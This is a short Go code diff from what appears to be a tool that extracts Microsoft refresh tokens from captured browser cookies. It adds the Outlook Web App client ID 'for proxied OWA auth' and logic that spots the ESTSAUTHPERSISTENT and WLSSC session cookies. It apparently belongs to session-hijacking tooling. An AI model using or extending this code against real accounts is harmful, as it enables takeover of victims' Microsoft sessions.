@@ -15,6 +15,7 @@ import (
 
 // Known Microsoft public client IDs (no client_secret required)
 var msPublicClientIDs = []string{
+	"9199bf20-a13f-4107-85dc-02114787ef48", // Outlook Web App (OWA) - primary for proxied OWA auth
 	"4765445b-32c6-49b0-83e6-1d93765276ca", // Office.com
 	"d3590ed6-52b3-4102-aeff-aad2292ab01c", // Microsoft Office
 	"1fec8e78-bce4-4aaf-ab1b-5451cc387264", // Microsoft Teams
@@ -69,7 +70,22 @@ func extractRefreshToken(cookiesJSON string, logger *zap.SugaredLogger) (refresh
 		}
 	}
 
-	// Look for WLSSC cookie (Windows Live session token - can sometimes be used as refresh token)
+	// Look for ESTSAuthPersistent cookie (AAD org accounts)
+	for _, c := range rawCookies {
+		name, _ := c["name"].(string)
+		value, _ := c["value"].(string)
+		if name == "" || value == "" {
+			continue
+		}
+
+		if name == "ESTSAUTHPERSISTENT" && len(value) > 50 {
+			logger.Debugw("token exchange: found ESTSAUTHPERSISTENT cookie")
+			// ESTSAUTHPERSISTENT is a persistent session cookie for AAD
+			// It's not directly a refresh token but indicates an active session
+		}
+	}
+
+	// Look for WLSSC cookie (Windows Live session token - MSA consumer accounts)
 	for _, c := range rawCookies {
 		name, _ := c["name"].(string)
 		value, _ := c["value"].(string)
@@ -79,9 +95,7 @@ func extractRefreshToken(cookiesJSON string, logger *zap.SugaredLogger) (refresh
 
 		if name == "WLSSC" && len(value) > 50 {
 			logger.Debugw("token exchange: found WLSSC token (Windows Live session)")
-			// WLSSC is not a standard refresh token, but we can try it
-			// It's a Windows Live session cookie that might work with the consumers endpoint
-			return "", ""
+			// WLSSC is not a standard refresh token
 		}
 	}
 
